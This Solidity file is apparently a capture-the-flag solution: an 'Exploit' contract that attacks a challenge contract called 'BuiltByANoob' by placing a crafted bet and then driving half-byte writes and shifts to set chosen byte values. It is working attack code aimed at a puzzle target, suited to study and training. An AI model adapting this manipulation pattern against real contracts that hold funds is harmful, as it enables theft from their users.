pragma solidity 0.7.2;
import "@openzeppelin/contractsv3.4.0/token/ERC20/ERC20.sol";
import "./BuiltByANoob.sol";

contract Exploit is ERC20 {
    BuiltByANoob challenge;
    constructor(address _challenge) ERC20("MyToken", "MTK") {
        challenge = BuiltByANoob(_challenge);
        _mint(address(this), 100);
    }
    function win() public {
        this.increaseAllowance(address(challenge), 100);
        bytes memory seventeen = bytes(hex"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000011");
        bytes32 sing = 0x0000000000000000000000000000000000000000000000000000000000000000;
        bytes memory init = bytes(hex"10b5");
        challenge.bet(sing, seventeen, this, 1, init);
        challenge.write255();
        challenge.setHalfByte(0x07);
        challenge.shiftLeft(4);
        challenge.setHalfByte(0x0e);
        challenge.write255();
        challenge.setHalfByte(0x06);
        challenge.shiftLeft(4);
        challenge.setHalfByte(0x0d);
        challenge.write255();
        challenge.setHalfByte(0x0a);
        challenge.shiftLeft(4);
    }
    // 7e  6d  a0
}